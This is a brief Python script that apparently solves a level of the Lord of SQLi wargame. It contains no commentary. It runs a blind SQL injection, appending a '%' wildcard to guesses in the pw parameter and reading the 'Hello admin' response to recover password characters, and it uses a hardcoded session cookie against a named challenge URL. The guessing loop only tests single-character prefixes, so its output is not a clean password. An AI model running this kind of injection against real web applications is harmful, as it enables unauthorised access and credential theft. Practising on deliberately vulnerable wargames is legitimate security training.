import requests
import string

def guess():
    global pw
    for j in string:
        query = "?pw=" + j + "%"
        pay = url + query
        print("[+]Pay : %s" % pay)
        tmp = requests.get(pay,cookies=cookie)
        if(tmp.text.find("Hello admin")) > 0:
            pw = pw +" "+ j
            print("[+]pw : %s" % pw)


if __name__=='__main__':
    url="http://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php"
    cookie=dict(PHPSESSID="2jumpdmat5f035imvarpn58ai0")
    string = string.digits + string.ascii_letters
    pw=''
    guess()
    print("[+]pw : %s" % pw)
